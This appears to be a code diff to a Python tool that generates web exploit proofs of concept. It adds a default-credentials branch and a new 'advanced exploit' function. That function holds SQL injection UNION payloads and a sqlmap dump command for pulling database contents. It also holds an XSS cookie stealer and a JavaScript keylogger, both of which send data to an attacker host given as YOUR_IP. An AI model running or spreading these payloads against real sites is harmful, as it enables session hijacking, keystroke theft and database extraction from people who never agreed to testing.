@@ -11,7 +11,8 @@ def generate_curl(vuln_type, url, parameter=None, payload=None):
         return f'curl -v -g "{url}"'
 
     elif "XSS" in vuln_type:
-        return f'curl -v -g "{url}" -H "Cookie: document.cookie"'
+        # ✅ FIXED: Removed invalid `document.cookie` JS syntax from HTTP header
+        return f'curl -v -g "{url}" -H "Cookie: session=<your_session_cookie_here>"'
 
     elif "Open Redirect" in vuln_type:
         return f'curl -v -L "{url}" -H "User-Agent: Mozilla/5.0"'
@@ -22,7 +23,7 @@ def generate_curl(vuln_type, url, parameter=None, payload=None):
     elif "Missing Header" in vuln_type:
         return f'curl -I "{url}"'
 
-    elif "Weak Credentials" in vuln_type:
+    elif "Weak Credentials" in vuln_type or "Default Credentials" in vuln_type:
         creds = payload.split(":") if payload and ":" in payload else ["admin", "admin"]
         username = creds[0]
         password = creds[1] if len(creds) > 1 else ""
@@ -116,7 +117,7 @@ for s in sensitive:
         print(f"\\n[!!!] Sensitive keyword found: {{s}}")
 '''
 
-    elif "Login Bypass" in vuln_type or "Weak Credentials" in vuln_type:
+    elif "Login Bypass" in vuln_type or "Weak Credentials" in vuln_type or "Default Credentials" in vuln_type:
         creds = payload.split(":") if payload and ":" in payload else ["admin", "admin"]
         username = creds[0]
         password = creds[1] if len(creds) > 1 else ""
@@ -144,7 +145,6 @@ for indicator in success_indicators:
 '''
 
     elif "Missing Header" in vuln_type:
-        header_name = parameter or "Security Header"
         return base + f'''
 # Missing Security Header — Verification
 response = session.get(url)
@@ -197,7 +197,7 @@ Connection: close
 
 '''
 
-    elif "Login Bypass" in vuln_type or "Weak Credentials" in vuln_type:
+    elif "Login Bypass" in vuln_type or "Weak Credentials" in vuln_type or "Default Credentials" in vuln_type:
         creds = payload.split(":") if payload and ":" in payload else ["admin", "admin"]
         username = creds[0]
         password = creds[1] if len(creds) > 1 else ""
@@ -272,3 +272,78 @@ def format_poc_terminal(poc):
 
     lines.append(f"{'='*60}\n")
     return "\n".join(lines)
+
+
+def generate_advanced_exploit(vuln_type, url, payload=None):
+    """Generate advanced multi-step exploit"""
+
+    if "SQL Injection" in vuln_type:
+        # ✅ FIXED: Extract replacement strings before f-string to avoid backslash syntax error
+        union_payload = "' UNION SELECT @@version--"
+        safe_payload = payload or ""
+        replaced_url = url.replace(safe_payload, union_payload)
+
+        return {
+            "title": "SQL Injection - Database Extraction",
+            "steps": [
+                {
+                    "name": "Step 1 - Confirm SQLi",
+                    "curl": f'curl -v -g "{url}"',
+                    "python": f'''import requests
+r = requests.get("{url}")
+print("Vulnerable!" if any(e in r.text.lower() for e in ["sql","mysql","syntax"]) else "Testing...")'''
+                },
+                {
+                    "name": "Step 2 - Extract DB Version",
+                    "curl": f'curl -v -g "{replaced_url}"',
+                    "python": f'''import requests
+r = requests.get("{url}", params={{"id": "' UNION SELECT @@version--"}})
+print(r.text[:500])'''
+                },
+                {
+                    "name": "Step 3 - List Databases",
+                    "curl": f'curl -v -g "{url}"',
+                    "python": f'''import requests
+r = requests.get("{url}", params={{"id": "' UNION SELECT schema_name FROM information_schema.schemata--"}})
+print(r.text[:500])'''
+                },
+                {
+                    "name": "Step 4 - Dump with SQLMap",
+                    "curl": f'sqlmap -u "{url}" --dbs --batch',
+                    "python": f'# Run: sqlmap -u "{url}" --dump --batch'
+                }
+            ]
+        }
+
+    elif "XSS" in vuln_type:
+        return {
+            "title": "XSS - Session Hijacking",
+            "steps": [
+                {
+                    "name": "Step 1 - Confirm XSS",
+                    "curl": f'curl -v -g "{url}"',
+                    "python": f'''import requests
+r = requests.get("{url}")
+print("XSS confirmed!" if "<script>" in r.text.lower() else "Testing...")'''
+                },
+                {
+                    "name": "Step 2 - Cookie Stealer",
+                    "curl": "# Host a server first: python3 -m http.server 8080",
+                    "python": f'''# Payload to steal cookies:
+payload = "<script>fetch('http://YOUR_IP:8080/?c='+document.cookie)</script>"
+# Inject into: {url}'''
+                },
+                {
+                    "name": "Step 3 - Keylogger",
+                    "curl": "# Advanced: inject keylogger",
+                    "python": '''payload = """<script>
+document.onkeypress = function(e) {{
+    fetch('http://YOUR_IP:8080/?k='+e.key);
+}}
+</script>"""
+print("Inject this payload into the XSS point")'''
+                }
+            ]
+        }
+
+    return None
